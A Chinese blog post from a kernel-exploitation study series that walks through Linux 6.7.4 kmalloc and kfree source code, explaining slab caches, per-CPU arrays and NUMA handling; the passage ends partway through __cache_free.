                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文笔者计划简要分析kmalloc以及kfree的主要分支流程。</p>
<p>注：本文分析使用的Linux版本为6.7.4.</p>
<h1 id="kmalloc"><a class="markdownIt-Anchor" href="#kmalloc"></a> kmalloc</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">1</span>) <span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">		index = kmalloc_index(size);</span><br><span class="line">		<span class="keyword">return</span> kmalloc_trace(</span><br><span class="line">				kmalloc_caches[kmalloc_type(flags, _RET_IP_)][index],</span><br><span class="line">				flags, size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>kmalloc有两个参数，第一个为要分配的大小，第二个为分配选项。根据Linux kernel源代码注释，分配选项主要用于确定分配方式，最为常用的是GFP_KERNEL，可能会出现一定的sleep；另外还有GFP_NOWAIT（必须立即分配）与GFP_ATOMIC（必须立即分配且可能使用紧急内存池-emergency pools），除了3个主选项外还有几个副选项，可用于内核在分配后立即清空这块空间内的内容（__GFP_ZERO，实际上kzalloc也是调用的kmalloc，加上了这个选项），忽略分配失败警告等。</p>
<p>这个函数内首先有一个判断，<code>__builtin_constant_p</code>是一个gcc的内置函数，用于判断一个值是否是常量，使用这个函数主要是用于优化函数性能。在函数内部判断size，如果大于<code>KMALLOC_MAX_CACHE_SIZE</code>（x64中为8192）则转向分配大块空间的函数。随后调用<code>kmalloc_index</code>函数根据size判断需要在哪个<code>kmem_cache</code>里面完成分配工作。不同的<code>kmem_cache</code>中保存的内存块size可能不同，但一个<code>kmem_cache</code>中可分配的内存块size相同。由于这些<code>kmem_cache</code>在内核启动时完成初始化，因此索引是固定的。这里<code>kmalloc_caches</code>是一个二维的<code>kmem_cache*</code>数组，第一维表示的是内存块的类型，有通用类型、专用于DMA类型等多种类型。第二维表示索引。</p>
<h1 id="kmalloc_trace"><a class="markdownIt-Anchor" href="#kmalloc_trace"></a> kmalloc_trace</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">kmalloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> gfpflags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,</span><br><span class="line">					    size, _RET_IP_);</span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);</span><br><span class="line"></span><br><span class="line">	ret = kasan_kmalloc(s, ret, size, gfpflags);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_trace);</span><br></pre></td></tr></table></figure>
<p>这里最后有一个<code>kasan_kmalloc</code>，它的主要功能是缓解针对内核内存管理器的攻击，没有对要分配的内存块本身进行任何操作，这里跳过。分配内存的主要逻辑在<code>__kmem_cache_alloc_node -&gt; slab_alloc_node</code>中。</p>
<h1 id="slab_alloc_node"><a class="markdownIt-Anchor" href="#slab_alloc_node"></a> slab_alloc_node</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">slab_alloc_node</span><span class="params">(<span class="keyword">struct</span> kmem_cache *cachep, <span class="keyword">struct</span> list_lru *lru, <span class="type">gfp_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> nodeid, <span class="type">size_t</span> orig_size, <span class="type">unsigned</span> <span class="type">long</span> caller)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> save_flags;</span><br><span class="line">	<span class="type">void</span> *objp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">bool</span> init = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	flags &amp;= gfp_allowed_mask;</span><br><span class="line">	cachep = slab_pre_alloc_hook(cachep, lru, &amp;objcg, <span class="number">1</span>, flags);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!cachep))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	objp = kfence_alloc(cachep, orig_size, flags);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(objp))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	local_irq_save(save_flags);</span><br><span class="line">	objp = __do_cache_alloc(cachep, flags, nodeid);</span><br><span class="line">	local_irq_restore(save_flags);</span><br><span class="line">	objp = cache_alloc_debugcheck_after(cachep, flags, objp, caller);</span><br><span class="line">	prefetchw(objp);</span><br><span class="line">	init = slab_want_init_on_alloc(flags, cachep);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	slab_post_alloc_hook(cachep, objcg, flags, <span class="number">1</span>, &amp;objp, init,</span><br><span class="line">				cachep-&gt;object_size);</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数内部首先调用了一个<code>slab_pre_alloc_hook</code>，这是一个预处理钩子函数，查看源码发现主要完成一些检查工作，并不重要，后面的<code>slab_post_alloc_hook</code>是后处理钩子函数。这里核心的处理函数是<code>__do_cache_alloc</code>，它是所有内核内存分配函数都需要调用的。</p>
<h1 id="__do_cache_alloc"><a class="markdownIt-Anchor" href="#__do_cache_alloc"></a> __do_cache_alloc</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line">__do_cache_alloc(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags, <span class="type">int</span> nodeid)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *objp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> slab_node = numa_mem_id();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nodeid == NUMA_NO_NODE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;mempolicy || cpuset_do_slab_mem_spread()) &#123;</span><br><span class="line">			objp = alternate_node_alloc(cachep, flags);</span><br><span class="line">			<span class="keyword">if</span> (objp)</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Use the locally cached objects if possible.</span></span><br><span class="line"><span class="comment">		 * However ____cache_alloc does not allow fallback</span></span><br><span class="line"><span class="comment">		 * to other nodes. It may fail while we still have</span></span><br><span class="line"><span class="comment">		 * objects on other nodes available.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		objp = ____cache_alloc(cachep, flags);</span><br><span class="line">		nodeid = slab_node;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nodeid == slab_node) &#123;</span><br><span class="line">		objp = ____cache_alloc(cachep, flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!get_node(cachep, nodeid)) &#123;</span><br><span class="line">		<span class="comment">/* Node not bootstrapped yet */</span></span><br><span class="line">		objp = fallback_alloc(cachep, flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We may just have run out of memory on the local node.</span></span><br><span class="line"><span class="comment">	 * ____cache_alloc_node() knows how to locate memory on other nodes</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!objp)</span><br><span class="line">		objp = ____cache_alloc_node(cachep, flags, nodeid);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在默认情况下，<code>CONFIG_NUMA</code>开启，调用的是上面的函数，若没有开启则用于表示NUMA节点的参数node无效，转而直接调用<code>____cache_alloc</code>函数。NUMA节点这个参数是Linux 6.1才添加到<code>__do_cache_alloc</code>函数中的。</p>
<blockquote>
<p>NUMA 全称 Non-Uniform Memory Access，译为“非一致性内存访问”。这种构架下，不同的内存器件和CPU核心从属不同的 Node，每个 Node 都有自己的集成内存控制器（IMC，Integrated Memory Controller）。</p>
</blockquote>
<p>通过kmalloc调用传入的node参数实际上总为-1，即让系统自行决定节点，也就是走<code>if (nodeid == NUMA_NO_NODE)</code>内部。不过无论如何最终都需要调用<code>____cache_alloc</code>。</p>
<h1 id="____cache_alloc"><a class="markdownIt-Anchor" href="#____cache_alloc"></a> ____cache_alloc</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *____cache_alloc(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *objp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>;</span></span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line"></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">	<span class="keyword">if</span> (likely(ac-&gt;avail)) &#123;</span><br><span class="line">		ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line">		objp = ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line"></span><br><span class="line">		STATS_INC_ALLOCHIT(cachep);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	STATS_INC_ALLOCMISS(cachep);</span><br><span class="line">	objp = cache_alloc_refill(cachep, flags);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * the &#x27;ac&#x27; may be updated by cache_alloc_refill(),</span></span><br><span class="line"><span class="comment">	 * and kmemleak_erase() requires its correct value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * To avoid a false negative, if an object that is in one of the</span></span><br><span class="line"><span class="comment">	 * per-CPU caches is leaked, we need to make sure kmemleak doesn&#x27;t</span></span><br><span class="line"><span class="comment">	 * treat the array pointers as a reference to the object.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (objp)</span><br><span class="line">		kmemleak_erase(&amp;ac-&gt;entry[ac-&gt;avail]);</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于这个函数的解释，可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/358891862">资料</a>，这里添加一些方便理解的补充。</p>
<p><code>cpu_cache_get</code>返回的是<code>kmem_cache</code>中定义的CPU专用的空闲对象链表。不过这个结构说是链表，实际上它还是通过数组的形式实现的，从上面的代码可以看出，<code>objp = ac-&gt;entry[--ac-&gt;avail];</code>这条语句表明这里的空闲的obj是直接通过下标索引的，相比传统链表大大提高效率。当这里没有可用的对象时，会调用<code>cache_alloc_refill</code>继续查找可用对象。</p>
<h1 id="cache_alloc_refill"><a class="markdownIt-Anchor" href="#cache_alloc_refill"></a> cache_alloc_refill</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">cache_alloc_refill</span><span class="params">(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> batchcount;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>, *<span class="title">shared</span>;</span></span><br><span class="line">	<span class="type">int</span> node;</span><br><span class="line">	<span class="type">void</span> *<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line">	node = numa_mem_id();</span><br><span class="line"></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">	batchcount = ac-&gt;batchcount;</span><br><span class="line">	<span class="keyword">if</span> (!ac-&gt;touched &amp;&amp; batchcount &gt; BATCHREFILL_LIMIT) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If there was little recent activity on this cache, then</span></span><br><span class="line"><span class="comment">		 * perform only a partial refill.  Otherwise we could generate</span></span><br><span class="line"><span class="comment">		 * refill bouncing.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		batchcount = BATCHREFILL_LIMIT;</span><br><span class="line">	&#125;</span><br><span class="line">	n = get_node(cachep, node);</span><br><span class="line"></span><br><span class="line">	BUG_ON(ac-&gt;avail &gt; <span class="number">0</span> || !n);</span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line">	<span class="keyword">if</span> (!n-&gt;free_objects &amp;&amp; (!shared || !shared-&gt;avail))</span><br><span class="line">		<span class="keyword">goto</span> direct_grow;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock(&amp;n-&gt;list_lock);</span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* See if we can refill from the shared array */</span></span><br><span class="line">	<span class="keyword">if</span> (shared &amp;&amp; transfer_objects(ac, shared, batchcount)) &#123;</span><br><span class="line">		shared-&gt;touched = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">goto</span> alloc_done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (batchcount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Get slab alloc is to come from. */</span></span><br><span class="line">		slab = get_first_slab(n, <span class="literal">false</span>);</span><br><span class="line">		<span class="keyword">if</span> (!slab)</span><br><span class="line">			<span class="keyword">goto</span> must_grow;</span><br><span class="line"></span><br><span class="line">		check_spinlock_acquired(cachep);</span><br><span class="line"></span><br><span class="line">		batchcount = alloc_block(cachep, ac, slab, batchcount);</span><br><span class="line">		fixup_slab_list(cachep, n, slab, &amp;<span class="built_in">list</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">must_grow:</span><br><span class="line">	n-&gt;free_objects -= ac-&gt;avail;</span><br><span class="line">alloc_done:</span><br><span class="line">	raw_spin_unlock(&amp;n-&gt;list_lock);</span><br><span class="line">	fixup_objfreelist_debug(cachep, &amp;<span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">direct_grow:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ac-&gt;avail)) &#123;</span><br><span class="line">		<span class="comment">/* Check if we can use obj in pfmemalloc slab */</span></span><br><span class="line">		<span class="keyword">if</span> (sk_memalloc_socks()) &#123;</span><br><span class="line">			<span class="type">void</span> *obj = cache_alloc_pfmemalloc(cachep, n, flags);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (obj)</span><br><span class="line">				<span class="keyword">return</span> obj;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		slab = cache_grow_begin(cachep, gfp_exact_node(flags), node);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * cache_grow_begin() can reenable interrupts,</span></span><br><span class="line"><span class="comment">		 * then ac could change.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ac = cpu_cache_get(cachep);</span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail &amp;&amp; slab)</span><br><span class="line">			alloc_block(cachep, ac, slab, batchcount);</span><br><span class="line">		cache_grow_end(cachep, slab);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的<code>if (!n-&gt;free_objects &amp;&amp; (!shared || !shared-&gt;avail))</code>这条语句，这里的目的是检查所有CPU共享的空闲链表中是否有可分配的对象，以及检查该节点中是否有空闲对象（<code>free_objects</code>指的是一个<code>kmem_cache_node</code>中的空闲对象数量），如果都没有则需要调用伙伴系统分配空间。</p>
<p>随后调用<code>transfer_objects</code>尝试从共享空间中将<code>batchcount</code>个空闲对象批量移动到CPU专属空闲链表中。后面直接从这里进行分配。而如果共享空间中没有可用对象，则会调用<code>get_first_slab</code>获取空闲slab，调用<code>alloc_block</code>将空闲slab上的空闲对象转移到CPU专属空闲链表中进行后续分配。</p>
<p>从上面的分析可以看到，无论是CPU专属空闲对象链表，还是NUMA节点全CPU共享空闲对象链表，它们只是起到了一个临时保存空闲对象的作用，并不会影响内核决定使用哪一个slab。</p>
<hr />
<p>以上就是对kmalloc的主要流程分析，下面是kfree的分析。</p>
<hr />
<h1 id="kfree"><a class="markdownIt-Anchor" href="#kfree"></a> kfree</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *object)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">	trace_kfree(_RET_IP_, object);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	folio = virt_to_folio(object);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;</span><br><span class="line">		free_large_kmalloc(folio, (<span class="type">void</span> *)object);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	slab = folio_slab(folio);</span><br><span class="line">	s = slab-&gt;slab_cache;</span><br><span class="line">	__kmem_cache_free(s, (<span class="type">void</span> *)object, _RET_IP_);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kfree);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __kmem_cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">		       <span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	__do_kmem_cache_free(cachep, objp, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline</span><br><span class="line"><span class="type">void</span> __do_kmem_cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">	local_irq_save(flags);</span><br><span class="line">	debug_check_no_locks_freed(objp, cachep-&gt;object_size);</span><br><span class="line">	<span class="keyword">if</span> (!(cachep-&gt;flags &amp; SLAB_DEBUG_OBJECTS))</span><br><span class="line">		debug_check_no_obj_freed(objp, cachep-&gt;object_size);</span><br><span class="line">	__cache_free(cachep, objp, caller);</span><br><span class="line">	local_irq_restore(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> __cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">					 <span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> init;</span><br><span class="line"></span><br><span class="line">	memcg_slab_free_hook(cachep, virt_to_slab(objp), &amp;objp, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (is_kfence_address(objp)) &#123;</span><br><span class="line">		kmemleak_free_recursive(objp, cachep-&gt;flags);</span><br><span class="line">		__kfence_free(objp);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * As memory initialization might be integrated into KASAN,</span></span><br><span class="line"><span class="comment">	 * kasan_slab_free and initialization memset must be</span></span><br><span class="line"><span class="comment">	 * kept together to avoid discrepancies in behavior.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	init = slab_want_init_on_free(cachep);</span><br><span class="line">	<span class="keyword">if</span> (init &amp;&amp; !kasan_has_integrated_init())</span><br><span class="line">		<span class="built_in">memset</span>(objp, <span class="number">0</span>, cachep-&gt;object_size);</span><br><span class="line">	<span class="comment">/* KASAN might put objp into memory quarantine, delaying its reuse. */</span></span><br><span class="line">	<span class="keyword">if</span> (kasan_slab_free(cachep, objp, init))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 